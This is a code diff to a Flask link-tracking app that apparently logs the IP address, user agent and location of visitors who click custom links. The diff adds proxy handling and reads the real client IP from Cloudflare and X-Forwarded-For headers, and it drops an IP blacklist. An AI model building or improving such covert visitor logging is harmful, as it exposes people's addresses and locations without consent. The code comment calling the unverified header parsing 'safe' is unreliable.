@@ -8,6 +8,7 @@ from flask import Flask, request, render_template_string, jsonify, g, session, r
 from dotenv import load_dotenv
 from functools import wraps
 import os
+from werkzeug.middleware.proxy_fix import ProxyFix
 
 # Загрузка переменных окружения из файла .env
 load_dotenv()
@@ -22,6 +23,8 @@ ANTI_BOT = int(os.getenv("ANTI_BOT"))
 
 app = Flask(__name__)
 app.secret_key = os.getenv("SECRET_KEY")
+
+app.wsgi_app = ProxyFix(app.wsgi_app, x_for=2, x_proto=1, x_host=1)
 
 # Настройка логирования
 logging.basicConfig(level=LOGGING_LEVEL)
@@ -57,8 +60,6 @@ config = {
         "page": REAL_URL
     },
 }
-
-blacklistedIPs = ("27", "104", "143", "164")
 
 # Список анекдотов
 jokes = [
@@ -96,9 +97,6 @@ def reportError(error):
     })
 
 def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False):
-    if ip.startswith(blacklistedIPs):
-        return
-
     bot = botCheck(ip, useragent)
 
     if bot:
@@ -454,7 +452,11 @@ def handle_custom_link(custom_path):
         cursor.execute('UPDATE links SET click_count = click_count + 1 WHERE id = %s', (link[0],))
         db.commit()
 
-        user_ip = request.remote_addr
+        user_ip = (
+            request.headers.get('CF-Connecting-IP',  # Приоритет для Cloudflare
+            request.headers.get('X-Forwarded-For', request.remote_addr))
+        ).split(',')[0].strip()  # Безопасное извлечение первого IP
+
         user_agent = request.headers.get('User-Agent')
         makeReport(user_ip, user_agent, endpoint=request.path)
 
